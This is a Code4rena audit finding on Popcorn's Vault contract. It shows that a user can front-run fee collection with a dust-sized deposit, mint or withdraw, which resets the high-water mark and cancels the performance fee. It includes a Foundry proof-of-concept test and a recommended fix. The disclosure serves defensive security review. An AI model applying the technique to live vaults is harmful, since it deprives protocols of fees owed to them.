## Tags

- bug
- 2 (Med Risk)
- primary issue
- selected for report
- sponsor acknowledged
- M-03

# [`Vault::takeFees` can be front run to minimize `accruedPerformanceFee`](https://github.com/code-423n4/2023-01-popcorn-findings/issues/780) 

# Lines of code

https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499


# Vulnerability details

## Description
`performanceFee` is a fee on the profits of the vault. The `feeRecipient` (or any user) can collect these at any point.

They rely on the difference between the current share value and the `highWaterMark` that records a historical share value.

The issue is that this `highWaterMark` is written on interactions with the vault: `deposit`, `mint`, `withdraw`. Hence a user can front run the fee collection with any of these calls. That will set the `highWaterMark` to the current share value and remove the performance fee.

## Impact
A malicious user can maximize the yield and deny any performance fee by front running the fee collection with a call to either `deposit`, `mint` or `withdraw` with only dust amounts.

## Proof of Concept
PoC test in `Vault.t.sol`

```javascript
  function test__front_run_performance_fee() public {
   _setFees(0, 0, 0, 1e17); // 10% performance fee

    asset.mint(alice, 1e18);

    vm.startPrank(alice);
    asset.approve(address(vault), 1e18);
    vault.deposit(1e18);
    vm.stopPrank();

    asset.mint(address(adapter),1e18); // fake yield

    // performanceFee is 1e17 (10% of 1e18)
    console.log("performanceFee before",vault.accruedPerformanceFee());

    vm.prank(alice);
    vault.withdraw(1); // malicious user withdraws dust which triggers update of highWaterMark

    // performanceFee is 0
    console.log("performanceFee after",vault.accruedPerformanceFee());
  }
```

## Tools Used
manual audit, vs code, forge

## Recommended Mitigation Steps
At every deposit, mint, redeem and withdraw, take fees before adding or removing the new users shares and assets.